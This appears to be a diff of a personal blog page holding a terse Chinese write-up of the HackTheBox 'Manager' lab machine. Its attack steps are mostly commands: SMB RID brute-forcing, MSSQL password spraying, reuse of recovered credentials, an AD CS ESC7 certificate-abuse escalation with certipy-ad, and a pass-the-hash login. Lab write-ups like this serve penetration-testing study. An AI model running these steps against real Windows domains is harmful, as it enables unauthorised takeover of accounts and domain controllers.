@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            归档
+            HTB_Manager-第三季度
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,15 +31,36 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/archive.css">
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">归档</h1>
+                <h1 class="header-subtitle">HTB_Manager-第三季度</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-10-24
+                        </span>
+                        
+                            <span id="/2023/10/24/HTB-Manager-第三季度/" class="leancloud_visitors" data-flag-title="HTB_Manager-第三季度">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/10/24/HTB-Manager-第三季度/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">HTB</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">HTB</span>
+                        
+                    
                 </div>
             
         </div>
@@ -48,135 +69,104 @@
 </div>
 <div id="container">
     
-        
-            <!-- 归档页面、分类归档页面、标签归档页面 -->
-            <div class="articles">
-                <div class="articles-wrap">
-                    <span class="archive-move-on"></span>
-                    <span class="archive-counter">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <p>s</p>
+<p>又开始了，这个开始还是nmap 扫描</p>
+<p>扫描到了很多端口 80 445 1433 mssql端口</p>
+<p><img src="/image/HTB3/manager/nmap.png" alt="这是图片" title="hosts"></p>
+<p>80端口看了一下，不太会没有什么能入手的地方</p>
+<p>看看445端口</p>
+<p>这里用的是crackmapexec</p>
+<p><code>crackmapexec smb 10.10.11.236 -u guest -p &#39;&#39; --rid-brute</code></p>
+<p>指定smb模块，目标10.10.11.236 用户名为guest 空密码 爆破rid</p>
+<p><code>impacket-GetNPUsers -request -usersfile 1.txt -dc-ip dc01.manager.htb manager.htb/ </code></p>
+<p>接下来看看这些用户名有没有没有经过域认证的，能进行爆破密码的</p>
+<p><img src="/image/HTB3/manager/pnuser.png" alt="这是图片" title="hosts"></p>
+<p>没有能利用的</p>
+<p>刚才看到又1433服务是mssql看看能不能爆破一下用户密码，密码就用刚才的用户名字试试，大小小写都有</p>
+<p><code>crackmapexec mssql manager.htb -u user.txt -p user.txt --no-bruteforce</code></p>
+<p>成功爆破出密码接下来看看能不能链接上 mssql</p>
+<p><code>python3 mssqlclient.py manager.htb/operator:operator@manager.htb -dc-ip dc01.manager.htb -windows-auth</code></p>
+<p>这个得我用的10版本可以</p>
+<p><code>xp_dirtree &quot;C:\inepub\wwwroot&quot;,1,1</code></p>
+<p><img src="/image/HTB3/manager/mssqlclient.png" alt="这是图片" title="hosts"></p>
+<p>有个网站backup文件，下载下来有个隐藏的xml 里面放着账户密码</p>
+<p><img src="/image/HTB3/manager/shadow.png" alt="这是图片" title="hosts"></p>
+<p>然后用evil-winrm工具来链接 <code>evil-winrm -i manager.htb -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39;</code></p>
+<p>连接进去拿到user.txt 然后使用的是 certify 查看证书方面有没有什么漏洞</p>
+<p>然后再用 bloodhound 寻血猎犬 信息收集一下 具体去csdn查</p>
+<p>最后是利用的这个漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7">AD CS 域升级 - 黑客技巧 (hacktricks.xyz)</a></p>
+<p>具体自己看吧 累了</p>
+<p>certipy-ad ca -ca ‘manager-DC01-CA’ -add-officer raven -username <a href="mailto:&#114;&#x61;&#x76;&#101;&#x6e;&#x40;&#x6d;&#97;&#x6e;&#97;&#103;&#101;&#x72;&#x2e;&#104;&#x74;&#x62;">&#114;&#x61;&#x76;&#101;&#x6e;&#x40;&#x6d;&#97;&#x6e;&#97;&#103;&#101;&#x72;&#x2e;&#104;&#x74;&#x62;</a> -password ‘R4v3nBe5tD3veloP3r!123’</p>
+<p>certipy-ad req -username <a href="mailto:&#x72;&#x61;&#118;&#x65;&#110;&#x40;&#109;&#97;&#110;&#97;&#x67;&#101;&#x72;&#x2e;&#104;&#116;&#x62;">&#x72;&#x61;&#118;&#x65;&#110;&#x40;&#109;&#97;&#110;&#97;&#x67;&#101;&#x72;&#x2e;&#104;&#116;&#x62;</a> -password ‘R4v3nBe5tD3veloP3r!123’ -ca ‘manager-DC01-CA’ -target manager.htb -template SubCA -upn <a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#x6d;&#x61;&#110;&#x61;&#103;&#101;&#114;&#x2e;&#104;&#116;&#98;">&#x61;&#x64;&#109;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#x6d;&#x61;&#110;&#x61;&#103;&#101;&#114;&#x2e;&#104;&#116;&#98;</a></p>
+<p>certipy-ad ca -ca ‘manager-DC01-CA’ -issue-request 25 -username <a href="mailto:&#114;&#97;&#x76;&#x65;&#110;&#x40;&#109;&#97;&#110;&#97;&#x67;&#x65;&#x72;&#x2e;&#x68;&#x74;&#x62;">&#114;&#97;&#x76;&#x65;&#110;&#x40;&#109;&#97;&#110;&#97;&#x67;&#x65;&#x72;&#x2e;&#x68;&#x74;&#x62;</a> -password ‘R4v3nBe5tD3veloP3r!123’</p>
+<p>certipy-ad req -username <a href="mailto:&#x72;&#97;&#x76;&#101;&#x6e;&#x40;&#x6d;&#97;&#110;&#x61;&#x67;&#101;&#114;&#46;&#x68;&#x74;&#x62;">&#x72;&#97;&#x76;&#101;&#x6e;&#x40;&#x6d;&#97;&#110;&#x61;&#x67;&#101;&#114;&#46;&#x68;&#x74;&#x62;</a> -password ‘R4v3nBe5tD3veloP3r!123’ -ca ‘manager-DC01-CA’ -target manager.htb -retrieve 25</p>
+<p>在这之前要同步服务器的时间 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -u manager.htb</span><br></pre></td></tr></table></figure>
+
+<p>certipy-ad auth -pfx ‘administrator.pfx’ -username ‘administrator’ -domain ‘manager.htb’ -dc-ip 10.10.11.236</p>
+<p>evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/10/24/HTB-Manager-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" target="_blank">HTB_Manager-第三季度</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
                         
-                            目前共计 40 篇日志，继续加油！
+                            <a href="/categorie/HTB/">HTB</a>
                         
-                    </span>
-                    
-                    
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
                         
-                            <div class="archive-title">
-                                <h2 class="archive-year">2023</h2>
-                            </div>
-                            
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/09/24/sliver%E5%AD%A6%E4%B9%A0/"><span>sliver学习</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">09-24</span>
-                                </div>
-                            </div>
-                        </div>
+                            <a href="/tag/HTB/">HTB</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
                     
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/09/22/windows%E4%B8%AD%E7%9A%84token/"><span>windows中的token</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">09-22</span>
-                                </div>
-                            </div>
-                        </div>
                     
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/09/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><span>内网横向移动</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">09-21</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/09/14/%E5%AE%9E%E6%88%98%E4%B8%AD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span>实战中代码审计</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">09-14</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/09/13/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"><span>域渗透学习</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">09-13</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/08/16/%E5%A4%A7%E9%A9%AC%E5%AD%A6%E4%B9%A0/"><span>大马学习</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">08-16</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/07/03/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/"><span></span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">07-03</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/05/31/xml%E5%AD%A6%E4%B9%A0/"><span>xml学习</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">05-31</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/30/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"><span>postgresql数据库</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-30</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/28/msf%E4%BD%BF%E7%94%A8/"><span>msf使用</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-28</span>
-                                </div>
-                            </div>
-                        </div>
+                        <a href="/2023/10/24/crackmapexec%E9%A3%9F%E7%94%A8/" class="next-prefix">» </a> 下一篇：    <a href="/2023/10/24/crackmapexec%E9%A3%9F%E7%94%A8/" title="发布于 2023-10-24 01:47">crackmapexec食用</a>
                     
                 </div>
             </div>
             
+    <div class="article-comments">
         
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a class="extend prev" rel="prev" href="/archive/2023/">上一页</a><a class="page-number" href="/archive/2023/">1</a><span class="page-number current">2</span><a class="page-number" href="/archive/2023/page/3/">3</a><a class="page-number" href="/archive/2023/page/4/">4</a><a class="extend next" rel="next" href="/archive/2023/page/3/">下一页</a>
-            
-        </div>
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
     </div>
 
+        </div>
     
 </div>
     <div id="footer"></div>
@@ -208,7 +198,7 @@
                     
                         <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
                     
-                        <li class=" active "><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
                     
                         <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
                     
